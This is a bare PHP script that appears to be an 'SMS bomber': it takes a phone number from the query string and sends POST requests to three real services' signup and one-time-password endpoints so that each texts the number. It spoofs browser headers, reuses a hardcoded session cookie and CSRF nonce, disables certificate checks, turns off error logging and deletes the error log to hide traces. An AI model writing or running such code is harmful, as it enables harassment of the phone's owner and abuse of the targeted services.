<?php
 error_reporting( 0 );
ini_set( "log_errors","Off" );
$phone = $_GET ["phone"];
$url = "https://sandbox.sibirani.ir/api/v1/user/invite";
$data = "{\"username\":\"$phone\"}";
$headers = [
"Host: sandbox.sibirani.ir",
"User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
"Accept: application/json",
"Accept-Language: en-US,en;q=0.5",
"Accept-Encoding: gzip, deflate, br",
"Referer: https://developer.sibirani.com/",
"Content-Type: application/json",
"Content-Length: 26",
"Origin: https://developer.sibirani.com",
"Connection: keep-alive",
"Sec-Fetch-Dest: empty",
"Sec-Fetch-Mode: no-cors",
"Sec-Fetch-Site: cross-site",
"TE: trailers",
"Pragma: no-cache",
"Cache-Control: no-cache"
    ];
$curl = curl_init();
curl_setopt_array($curl, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $data,
    CURLOPT_HEADER => true,
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_RETURNTRANSFER => true
]);
curl_exec($curl);
$phone = $_GET ["phone"];
$url = "https://lotuslaptop.com/wp-admin/admin-ajax.php";
$phone2 = str_replace("09","9","$phone");
$data = "action=digits_check_mob&countrycode=%2B98&mobileNo=$phone2&csrf=5cffb8325d&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=$phone2&dig_otp=&digits_login_remember_me=1&dig_nounce=5cffb8325d";
$headers = [
"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
"Cookie: digits_countrycode=98; PHPSESSID=e597cc1728b9f8d9fcce428ce69655e8; ls-popup-last-displayed=1646068260; _ga=GA1.2.190193858.1646068262; _gid=GA1.2.411526926.1646068262",
];
$curl = curl_init();
curl_setopt_array($curl, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $data,
    CURLOPT_HEADER => true,
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_RETURNTRANSFER => true
]);
curl_exec($curl);
$phone = $_GET ["phone"];
$url = "https://api.komodaa.com/api/v2.6/loginRC/request";
$data = "{\"phone_number\":\"$phone\"}";
$headers = [
"Content-Type: application/json"
    ];
$curl = curl_init();
curl_setopt_array($curl, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $data,
    CURLOPT_HEADER => true,
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_RETURNTRANSFER => true
]);
curl_exec($curl);
unlink("error_log");
?>